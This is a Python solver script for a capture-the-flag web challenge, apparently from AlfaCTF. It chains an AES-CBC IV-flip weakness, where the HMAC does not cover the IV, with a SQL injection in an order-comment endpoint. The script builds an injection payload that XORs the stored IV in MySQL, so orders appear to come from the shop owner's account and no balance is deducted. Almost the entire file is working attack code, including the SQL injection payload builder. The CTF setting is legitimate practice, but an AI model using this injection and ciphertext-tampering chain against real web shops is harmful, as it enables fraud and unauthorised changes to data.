#!/usr/bin/env python3
# /// script
# requires-python = ">=3.10"
# dependencies = ["requests"]
# ///
"""
Dresscode CTF solver.

Vulnerabilities:
1. AES-CBC: HMAC covers only ciphertext, not IV -> IV-flip attack on first block.
2. SQL injection in /orders/<id>/update_comment (comment value f-stringed into UPDATE).
3. Validator skips balance deduction when data.from == "1000001" (owner AlexCab).

Plan: register a user whose 7-digit id ends in '1'.  Plaintext starts with
`{"from": "DDDDDDD"`; the 7th digit (byte 16 of plaintext) is unchanged by an
IV flip on the first 16-byte block.  Flip bytes 10-15 from the user's first
six digits to "100000" so the from-field reads "1000001".

The flip is applied in MySQL by hex-byte-wise XOR via the SQLi -- we never
need to read the original IV.

After the validator processes the modified ciphertext: from=1000001 (owner,
balance=999_999_999, no deduction), items inserted into our inventory.
Then /check_dresscode awards the flag.
"""
import re
import sys
import time
import secrets
import requests

URL = "https://dresscode-qdieizd0.alfactf.ru"
PW  = "PassPhrase_" + secrets.token_hex(4)

# one cheap item per required category
ITEMS = [72, 15, 24, 30, 40, 51, 53, 57]
# jacket, pants, shorts, tshirt, sneakers, cap, gloves, accessories

def newsess():
    s = requests.Session()
    s.headers["User-Agent"] = "ctf-solver"
    return s

def api_register(s, username, password):
    return s.post(f"{URL}/api/register",
                  json={"username": username, "password": password},
                  timeout=60).json()

def web_login(s, username, password):
    r = s.post(f"{URL}/login",
               data={"username": username, "password": password},
               allow_redirects=False, timeout=30)
    return r.status_code in (301, 302)

UID_RE = re.compile(r"Member ID</th>\s*<td[^>]*>\s*(\d+)\s*</td>", re.S)

def fetch_uid(s):
    html = s.get(f"{URL}/profile", timeout=30).text
    m = UID_RE.search(html)
    return m.group(1) if m else None

def find_account_ending_in_1(max_attempts=80):
    for i in range(max_attempts):
        s = newsess()
        u = "u_" + secrets.token_hex(6)
        res = api_register(s, u, PW)
        if not res.get("success"):
            print(f"[reg {i}] register fail: {res}")
            continue
        if not web_login(s, u, PW):
            print(f"[reg {i}] login fail for {u}")
            continue
        uid = fetch_uid(s)
        print(f"[reg {i}] {u} -> uid={uid}")
        if uid and uid.endswith("1"):
            return s, u, uid
    raise SystemExit("no uid ending in '1' found")

def add_cart(s, item_id):
    r = s.post(f"{URL}/api/cart/add/{item_id}", timeout=30)
    return r.json()

def clear_cart(s):
    s.post(f"{URL}/api/cart/clear", timeout=30)

def checkout(s):
    r = s.post(f"{URL}/checkout",
               data={"gift_to": "", "comment": ""},
               allow_redirects=False, timeout=30)
    loc = r.headers.get("Location", "")
    m = re.search(r"/order/([^/?]+)", loc)
    if not m:
        raise RuntimeError(f"no order id in redirect: {r.status_code} loc={loc!r} body={r.text[:200]}")
    return m.group(1)

def update_comment(s, order_id, payload):
    r = s.post(f"{URL}/orders/{order_id}/update_comment",
               data={"comment": payload},
               allow_redirects=True, timeout=30)
    # extract flash message if any
    fm = re.search(r'class="flash (\w+)">([^<]+)</', r.text)
    return r, (fm.groups() if fm else None)

def order_status(s, order_id):
    html = s.get(f"{URL}/order/{order_id}", timeout=30).text
    if 'class="status-completed"' in html:
        return "completed"
    if 'class="status-failed"' in html:
        return "failed"
    if 'class="status-pending"' in html:
        return "pending"
    return "unknown"

def build_iv_flip_payload(uid, order_id):
    """
    For uid like 'XXXXXXY' (Y == '1'), the first 16 bytes of plaintext are
        {"from": "XXXXXX
    We want them flipped to
        {"from": "100000
    so combined with the unchanged 7th digit Y='1' the from-value reads "1000001".

    delta is non-zero only at plaintext bytes 10..15.  In the iv hex string
    these correspond to characters 21..32 (1-indexed).
    """
    target = "100000"
    src = uid[:6]
    deltas = [ord(c) ^ ord(t) for c, t in zip(src, target)]

    parts = ["SUBSTR(iv,1,20)"]
    for i, d in enumerate(deltas):
        pos = 21 + 2 * i
        parts.append(
            f"LPAD(HEX(CONV(SUBSTR(iv,{pos},2),16,10) ^ {d}),2,'0')"
        )
    iv_expr = "CONCAT(" + ",".join(parts) + ")"

    # closing single quote, set iv expression, our own WHERE, and -- to swallow
    # the rest of the original query (the trailing  ' WHERE id = '<order_id>')
    payload = f"x', iv = {iv_expr} WHERE id = '{order_id}' -- "
    return payload

def attempt(s, uid):
    clear_cart(s)
    for it in ITEMS:
        add_cart(s, it)

    order_id = checkout(s)
    print(f"  order_id={order_id}")

    payload = build_iv_flip_payload(uid, order_id)
    r, flash = update_comment(s, order_id, payload)
    print(f"  update_comment: status={r.status_code} flash={flash}")

    # wait for validator
    deadline = time.time() + 30
    while time.time() < deadline:
        st = order_status(s, order_id)
        if st != "pending":
            print(f"  status={st}")
            return st
        time.sleep(1)
    return "timeout"

def main():
    print("[*] hunting for account with id ending in '1' ...")
    s, uname, uid = find_account_ending_in_1()
    print(f"[+] account: {uname}  uid={uid}")

    for i in range(6):
        print(f"\n[*] attempt {i+1}")
        st = attempt(s, uid)
        if st == "completed":
            break
        print(f"  attempt failed ({st}), retrying ...")
        time.sleep(1)
    else:
        print("[!] all attempts failed")
        sys.exit(1)

    print("\n[*] claiming flag ...")
    r = s.get(f"{URL}/check_dresscode", timeout=30)
    body = r.text
    m = re.search(r"alfa(?:ctf)?\{[^}]+\}", body)
    if m:
        print(f"\nFLAG: {m.group(0)}")
    else:
        # dump some context
        print("[!] no flag matched in response. snippet:")
        idx = body.find("Reward")
        if idx >= 0:
            print(body[idx:idx+1500])
        else:
            print(body[:2000])

if __name__ == "__main__":
    main()
